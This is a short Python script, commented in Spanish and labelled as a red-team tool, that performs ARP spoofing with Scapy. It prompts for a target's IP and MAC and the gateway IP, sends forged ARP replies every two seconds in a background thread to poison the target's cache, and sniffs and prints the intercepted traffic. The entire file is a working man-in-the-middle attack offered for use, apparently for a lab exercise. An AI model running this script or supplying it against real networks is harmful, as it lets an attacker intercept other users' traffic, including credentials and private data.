from scapy.all import ARP, Ether, sendp, sniff
import time
import sys
import threading

def arp_spoofing(targetIP, targetMAC, gatewayIP):
    """Envía paquetes ARP falsos continuamente para el envenenamiento usando sendp."""
    paquete = Ether(dst=targetMAC) / ARP(op=2, pdst=targetIP, hwdst=targetMAC, psrc=gatewayIP)
    sendp(paquete, verbose=False)

def start_arp_spoof(targetIP, targetMAC, gatewayIP):
    """Bucle en segundo plano para mantener el ARP Spoofing activo."""
    try:
        while True:
            arp_spoofing(targetIP, targetMAC, gatewayIP)
            time.sleep(2)
    except:
        pass

def process_packet(packet):
    """Función que se ejecuta cada vez que se intercepta un paquete de la víctima."""
    print(f"[+] Tráfico interceptado de la máquina azul: {packet.summary()}")

if __name__ == "__main__":
    print("==================================================")
    print("   RED TEAM - ARP SPOOFING & CAPTURA DE TRÁFICO")
    print("==================================================")
    
    targetIP = input("Ingrese la IP objetivo (Máquina Azul): ")
    targetMAC = input("Ingrese la MAC del objetivo: ")
    gatewayIP = input("Ingrese la IP del Gateway de la red: ")

    print(f"\n[*] Iniciando ataque ARP Spoofing contra {targetIP}...")

    # 1. Creamos y lanzamos el ataque ARP en un hilo secundario (background)
    hilo_spoof = threading.Thread(target=start_arp_spoof, args=(targetIP, targetMAC, gatewayIP), daemon=True)
    hilo_spoof.start()

    print("[*] Sniffer activo. Capturando tráfico de la red...")
    print("[*] Utilice CTRL + C para detener el ataque y la captura.\n")

    try:
        # 2. El hilo principal se queda escuchando (sniffing) todo el tráfico que provenga de la víctima
        sniff(prn=process_packet, store=0)
    except KeyboardInterrupt:
        print("\n[!] El ataque y la captura se detuvieron correctamente.")
